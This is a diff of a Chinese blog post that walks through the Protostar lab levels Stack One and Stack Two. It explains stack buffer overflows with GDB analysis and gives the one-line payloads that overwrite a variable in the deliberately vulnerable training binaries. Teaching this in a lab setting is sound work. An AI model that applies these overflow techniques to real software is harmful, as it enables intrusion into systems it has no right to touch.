@@ -4,7 +4,6 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="baidu-site-verification" content="codeva-1wZQQJBzcr" />
     <meta name="keywords" content="Pwn-protostar靶场2 stack one，stack two, Linux，二进制，IoT，CTF">
     <meta name="description" content="protostar靶场day2">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -19,17 +18,8 @@
 
 
     <title>Pwn-protostar靶场2 stack one，stack two | 8023</title>
-    <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+    <link rel="icon" type="image/png" href="/favicon.png">
     
-    <style>
-        body{
-            background-image: url(/medias/featureimages/17.jpg);
-            background-repeat:no-repeat;
-            background-size: 100% 100%;
-            background-attachment:fixed;
-        }
-    </style>
-
 
 
     <!-- bg-cover style     -->
@@ -62,9 +52,7 @@
 
     <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
 
-<meta name="generator" content="Hexo 5.4.1">
-<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
-</head>
+<meta name="generator" content="Hexo 7.3.0"></head>
 
 
 <body>
@@ -248,7 +236,7 @@
         
         <li><div class="divider"></div></li>
         <li>
-            <a href="https://github.com/Pr0b1em" class="waves-effect waves-light" target="_blank">
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                 <i class="fab fa-github-square fa-fw"></i>Fork Me
             </a>
         </li>
@@ -305,7 +293,7 @@
     }
 </style>
 
-<a href="https://github.com/Pr0b1em" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
    data-tooltip="Fork Me" data-position="left" data-delay="50">
     <svg viewBox="0 0 250 250" aria-hidden="true">
         <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
@@ -321,19 +309,6 @@
 </header>
 
     
-<script src="/libs/cryptojs/crypto-js.min.js"></script>
-<script>
-    (function() {
-        let pwd = '';
-        if (pwd && pwd.length > 0) {
-            if (pwd !== CryptoJS.SHA256(prompt('请输入访问本文章的密码')).toString(CryptoJS.enc.Hex)) {
-                alert('密码错误，将返回主页！');
-                location.href = '/';
-            }
-        }
-    })();
-</script>
-
 
 
 
@@ -366,12 +341,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn/">
-                                <span class="chip bg-color">pwn</span>
-                            </a>
-                        
                             <a href="/tags/%E7%AC%94%E8%AE%B0/">
                                 <span class="chip bg-color">笔记</span>
+                            </a>
+                        
+                            <a href="/tags/pwn/">
+                                <span class="chip bg-color">pwn</span>
                             </a>
                         
                     </div>
@@ -404,14 +379,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    2k
+                    2.1k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    8 分
+                    9 分
                 </div>
                 
 
@@ -425,38 +400,13 @@
         </div>
         <hr class="clearfix">
 
-        <!-- 代码块功能依赖 -->
-        <script type="text/javascript" src="/libs/codeBlock/codeBlockFunction.js"></script>
-
-
-        <!-- 代码块复制 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
-        
-
-        <!-- 代码块收缩 -->
-        
-        <script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
-        
-
-        <!-- 代码块折行 -->
-        
-        <style type="text/css">
-        code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
-        </style>
         
 
         
-        <!-- 是否加载使用自带的 prismjs. -->
-        <link rel="stylesheet" href="/libs/prism/prism.min.css">
-        
-
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <span id="more"></span>
-
-<h1 id="Pwn-protostar靶场2-stack-one，stack-two"><a href="#Pwn-protostar靶场2-stack-one，stack-two" class="headerlink" title="Pwn-protostar靶场2 stack one，stack two"></a>Pwn-protostar靶场2 stack one，stack two</h1><h3 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是<strong>缓冲区溢出</strong></h3><p>当系统<strong>向缓冲区写入的数据多于它可以容纳的数据时</strong>，就会发生缓冲区溢出或缓冲区溢出，用更简单的话说就是在程序运行时，系统会为程序在内存里<strong>生成一个固定空间</strong>，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作</p>
+                <h1 id="Pwn-protostar靶场2-stack-one，stack-two"><a href="#Pwn-protostar靶场2-stack-one，stack-two" class="headerlink" title="Pwn-protostar靶场2 stack one，stack two"></a>Pwn-protostar靶场2 stack one，stack two</h1><h3 id="什么是缓冲区溢出"><a href="#什么是缓冲区溢出" class="headerlink" title="什么是缓冲区溢出"></a>什么是<strong>缓冲区溢出</strong></h3><p>当系统<strong>向缓冲区写入的数据多于它可以容纳的数据时</strong>，就会发生缓冲区溢出或缓冲区溢出，用更简单的话说就是在程序运行时，系统会为程序在内存里<strong>生成一个固定空间</strong>，如果超过了这个空间，就会造成缓冲区溢出，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，甚至可以取得系统特权，进而进行各种非法操作</p>
 <h3 id="什么是寄存器"><a href="#什么是寄存器" class="headerlink" title="什么是寄存器"></a>什么是寄存器</h3><p>寄存器是内存中非常靠近cpu的区域，因此可以快速访问它们，但是在这些寄存器里面能存储的东西非常有限</p>
 <p>计算机寄存器是位于CPU内部的一组用于存储和处理数据的高速存储器。用于存放指令、数据和运算结果</p>
 <p>常见的寄存器名称以及作用：</p>
@@ -471,53 +421,53 @@
 指令指针寄存器（Instruction Pointer Register，EIP）：存储当前要执行的指令的内存地址，用于指示下一条要执行的指令。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h2 id="Stack-One"><a href="#Stack-One" class="headerlink" title="Stack One"></a>Stack One</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>stack one源码：</p>
-<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
+<span class="token punctuation">&#123;</span>
   <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"please specify an argument\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
+  <span class="token punctuation">&#125;</span>
 
   modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
   <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x61626364</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x61626364</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have correctly got the variable to the right value\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again, you got 0x%08x\n"</span><span class="token punctuation">,</span> modified<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h4 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h4><p>首先程序定义了两个函数变量</p>
 <pre class="line-numbers language-none"><code class="language-none">volatile int modified;
 char buffer[64];<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>整数型变量 modified 和字符型变量buffer，其中字符型变量buffer的字符存储最大为64个字节，然后程序检测了我们输入的参数</p>
-<pre class="line-numbers language-none"><code class="language-none">if(argc == 1) {
-    errx(1, "please specify an argument\n");
-}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">if(argc &#x3D;&#x3D; 1) &#123;
+    errx(1, &quot;please specify an argument\n&quot;);
+&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>如果我们只运行程序，不输入参数就会输出please specify an argument并结束程序</p>
 <p>之后程序定义了一个变量和进行了一个字符串复制操作</p>
-<pre class="line-numbers language-none"><code class="language-none">modified = 0;
+<pre class="line-numbers language-none"><code class="language-none">modified &#x3D; 0;
 strcpy(buffer, argv[1]);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
 <p>modified变量为0，然后将我们输入的参数复制到buffer变量里</p>
 <p>然后程序做了一个简单的if判断</p>
-<pre class="line-numbers language-none"><code class="language-none">if(modified == 0x61626364) {
-    printf("you have correctly got the variable to the right value\n");
-} else {
-    printf("Try again, you got 0x%08x\n", modified);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">if(modified &#x3D;&#x3D; 0x61626364) &#123;
+    printf(&quot;you have correctly got the variable to the right value\n&quot;);
+&#125; else &#123;
+    printf(&quot;Try again, you got 0x%08x\n&quot;, modified);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>如果modified变量等于0x61626364就输出you have correctly got the variable to the right value，代表着我们破解成功<br>0x61626364是十六进制，转换字符串是abcd</p>
-<p>也就是说，我们使modified变量变成abcd就成功了，但是modified变量设置为0，这里我们就需要栈溢出覆盖变量原本设置的值 </p>
+<p>也就是说，我们使modified变量变成abcd就成功了，但是modified变量设置为0，这里我们就需要栈溢出覆盖变量原本设置的值</p>
 <h4 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h4><p>使用gdb打开程序，输入指令查看汇编代码</p>
 <pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel
 disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -554,21 +504,21 @@ disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span>
 0x080484d5 &lt;main+113&gt;:  leave
 0x080484d6 &lt;main+114&gt;:  ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 程序最关键的地方在这里 </p>
+<p>程序最关键的地方在这里</p>
 <pre class="line-numbers language-none"><code class="language-none">0x080484a7 &lt;main+67&gt;:   mov    eax,DWORD PTR [esp+0x5c]
 0x080484ab &lt;main+71&gt;:   cmp    eax,0x61626364
 0x080484b0 &lt;main+76&gt;:   jne    0x80484c0 &lt;main+92&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
-<p>它使用mov指令将esp+0x5c栈内地址的值移动到eax寄存器里，然后用cmp指令将eax寄存器里的值与0x61626364做对比，如果对比的值不一样就执行jne指令跳转到0x80484c0地址继续执行其他指令 </p>
+<p>它使用mov指令将esp+0x5c栈内地址的值移动到eax寄存器里，然后用cmp指令将eax寄存器里的值与0x61626364做对比，如果对比的值不一样就执行jne指令跳转到0x80484c0地址继续执行其他指令</p>
 <h3 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>我们先在程序执行对比指令的地址下一个断点</p>
 <pre class="line-numbers language-none"><code class="language-none">b *0x080484ab<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 然后设置一下自动运行我们设置的命令 </p>
+<p>然后设置一下自动运行我们设置的命令</p>
 <pre class="line-numbers language-none"><code class="language-none">define hook-stop
-info registers   //显示寄存器里的地址
-x/24wx $esp      //显示esp寄存器里的内容
-x/2i $eip        //显示eip寄存器里的内容
-end              //结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+info registers   &#x2F;&#x2F;显示寄存器里的地址
+x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
+x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
+end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/img/1731310142307.png"></p>
 <p>然后执行程序，输入参数</p>
@@ -577,47 +527,47 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
 <p><img src="/img/1731310302953.png"></p>
 <p>程序执行到我们设置的断点处自动执行了我们上面设置的命令，在这里可以看到我们输入的8个大写A在栈中的位置，并且eax寄存器里的值为0</p>
 <p>之前说过，程序将esp+0x5c地址处的值移动到了eax寄存器里，然后执行对比指令</p>
-<p> 我们查看esp+0x5c地址存放的值 </p>
-<pre class="line-numbers language-none"><code class="language-none">x/wx $esp+0x5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>我们查看esp+0x5c地址存放的值</p>
+<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731310378730.png"></p>
-<p> esp+0x5c地址就是栈里的0xbffff78c，每一段存放四个字符，c代表的是12 </p>
-<p>从存放我们输入的值的栈地址到esp+0x5c，中间共有64个字符，也就是说，我们需要输出64个字符+4个我们指定的字符才能覆盖modified变量 </p>
+<p>esp+0x5c地址就是栈里的0xbffff78c，每一段存放四个字符，c代表的是12</p>
+<p>从存放我们输入的值的栈地址到esp+0x5c，中间共有64个字符，也就是说，我们需要输出64个字符+4个我们指定的字符才能覆盖modified变量</p>
 <p><strong>在这里还有一个知识点是在x86架构里，读取是由低到高的，要使modified变量变成0x61626364，不能直接输入abcd，而是dcba</strong></p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('a'*(4*16)+'dcba')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731310551190.png"></p>
 <p>成功破解！</p>
-<h2 id="Stack-Two"><a href="#Stack-Two" class="headerlink" title="Stack Two"></a>Stack Two</h2><h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
-<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<h2 id="Stack-Two"><a href="#Stack-Two" class="headerlink" title="Stack Two"></a>Stack Two</h2><h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
 
 <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
-<span class="token punctuation">{</span>
+<span class="token punctuation">&#123;</span>
   <span class="token keyword">volatile</span> <span class="token keyword">int</span> modified<span class="token punctuation">;</span>
   <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   <span class="token keyword">char</span> <span class="token operator">*</span>variable<span class="token punctuation">;</span>
 
   variable <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"GREENIE"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>variable <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>variable <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"please set the GREENIE environment variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
+  <span class="token punctuation">&#125;</span>
 
   modified <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
 
   <span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> variable<span class="token punctuation">)</span><span class="token punctuation">;</span>
 
-  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x0d0a0d0a</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>modified <span class="token operator">==</span> <span class="token number">0x0d0a0d0a</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"you have correctly modified the variable\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
       <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Try again, you got 0x%08x\n"</span><span class="token punctuation">,</span> modified<span class="token punctuation">)</span><span class="token punctuation">;</span>
-  <span class="token punctuation">}</span>
+  <span class="token punctuation">&#125;</span>
 
-<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 这个程序代码和第一个差不多，只不过是将我们的输入变成了读取环境变量里的<strong>GREENIE</strong>变量内容 </p>
+<p>这个程序代码和第一个差不多，只不过是将我们的输入变成了读取环境变量里的<strong>GREENIE</strong>变量内容</p>
 <h3 id="什么是环境变量"><a href="#什么是环境变量" class="headerlink" title="什么是环境变量"></a>什么是环境变量</h3><p>任何计算机编程语言的两个基本组成部分，变量和常量。就像数学方程式中的自变量一样。变量和常量都代表唯一的内存位置，其中包含程序在其计算中使用的数据。两者的区别在于，变量在执行过程中可能会发生变化，而常量不能重新赋值</p>
 <p>这里只举几个常见的环境变量</p>
 <h4 id="PATH"><a href="#PATH" class="headerlink" title="$PATH"></a>$PATH</h4><p>包含了一些目录列表，作用是终端会在这些目录中搜索要执行的程序<br> 查看$PATH环境变量</p>
@@ -631,19 +581,19 @@ end              //结束<span aria-hidden="true" class="line-numbers-rows"><spa
 
 <p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Environment_variable">关于环境变量更多信息</a></p>
 <h3 id="破解程序"><a href="#破解程序" class="headerlink" title="破解程序"></a>破解程序</h3><p>回到正题</p>
-<pre class="line-numbers language-none"><code class="language-none">variable = getenv("GREENIE");
+<pre class="line-numbers language-none"><code class="language-none">variable &#x3D; getenv(&quot;GREENIE&quot;);
 strcpy(buffer, variable);
 
-  if(modified == 0x0d0a0d0a) {
-      printf("you have correctly modified the variable\n");
-  } else {
-      printf("Try again, you got 0x%08x\n", modified);
-  }<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+  if(modified &#x3D;&#x3D; 0x0d0a0d0a) &#123;
+      printf(&quot;you have correctly modified the variable\n&quot;);
+  &#125; else &#123;
+      printf(&quot;Try again, you got 0x%08x\n&quot;, modified);
+  &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p>首先获取了一个名为GREENIE的环境变量，然后将内容赋予variable变量，之后if判断modified是否等于0x0d0a0d0a，这个和第一个程序一模一样，只不过我们不是通过输入来破解程序，而是将payload放到指定的环境变量里，然后程序读取环境变量 </p>
-<pre class="line-numbers language-none"><code class="language-none">export GREENIE=$(python -c "print 'A'*(4*16)+'\x0a\x0d\x0a\x0d'"); ./stack2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>首先获取了一个名为GREENIE的环境变量，然后将内容赋予variable变量，之后if判断modified是否等于0x0d0a0d0a，这个和第一个程序一模一样，只不过我们不是通过输入来破解程序，而是将payload放到指定的环境变量里，然后程序读取环境变量</p>
+<pre class="line-numbers language-none"><code class="language-none">export GREENIE&#x3D;$(python -c &quot;print &#39;A&#39;*(4*16)+&#39;\x0a\x0d\x0a\x0d&#39;&quot;); .&#x2F;stack2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p> 直接运行就能成功破解了 </p>
+<p>直接运行就能成功破解了</p>
 <p><img src="/img/1731310880852.png"></p>
 
                 
@@ -671,7 +621,7 @@ strcpy(buffer, variable);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2024/11122500.html">https://Pr0b1em.github.io/2024/11122500.html</a>
+                    <a href="https://pr0b1em.github.io/2024/11122500.html">https://pr0b1em.github.io/2024/11122500.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -709,12 +659,12 @@ strcpy(buffer, variable);
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
-                                </a>
-                            
                                 <a href="/tags/%E7%AC%94%E8%AE%B0/">
                                     <span class="chip bg-color">笔记</span>
+                                </a>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
                                 </a>
                             
                         </div>
@@ -725,7 +675,7 @@ strcpy(buffer, variable);
 <div id="article-share">
 
     
-    <div class="social-share" data-sites="qq,wechat" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
     <script src="/libs/share/js/social-share.min.js"></script>
     
 
@@ -831,12 +781,12 @@ strcpy(buffer, variable);
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
                     <a href="/tags/%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -884,12 +834,12 @@ strcpy(buffer, variable);
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
                     <a href="/tags/%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -903,50 +853,10 @@ strcpy(buffer, variable);
 </div>
 
 
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: 8023<br />'
-            + '文章作者: Pr0b1em<br />'
-            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者Pr0b1em所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
-
 
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -1070,7 +980,7 @@ strcpy(buffer, variable);
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">43.8k</span>
+                        class="white-color">44.7k</span>
             
             
             
@@ -1104,8 +1014,8 @@ strcpy(buffer, variable);
                         var startYear = "2021";
                         var startMonth = "6";
                         var startDate = "17";
-                        var startHour = "17";
-                        var startMinute = "30";
+                        var startHour = "0";
+                        var startMinute = "0";
                         var startSecond = "0";
